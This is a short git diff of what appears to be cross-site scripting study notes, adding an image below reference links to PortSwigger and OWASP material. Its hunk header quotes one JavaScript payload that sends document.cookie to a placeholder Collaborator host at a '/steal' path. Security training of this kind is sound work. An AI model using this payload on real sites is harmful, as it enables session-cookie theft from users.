@@ -252,3 +252,5 @@ document.location='https://YOUR-COLLABORATOR.oastify.com/steal?c='+document.cook
 - [XSS Contexts](https://portswigger.net/web-security/cross-site-scripting/contexts)
 - [Content Security Policy (CSP) Bypass](https://portswigger.net/web-security/cross-site-scripting/content-security-policy)
 - [OWASP XSS Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html)
+
+<img width="1054" height="1492" alt="ChatGPT Image Jun 2, 2026, 11_35_56 PM" src="https://github.com/user-attachments/assets/01c0b9b3-cf41-4abd-a4da-5c8a1d8f6f1f" />
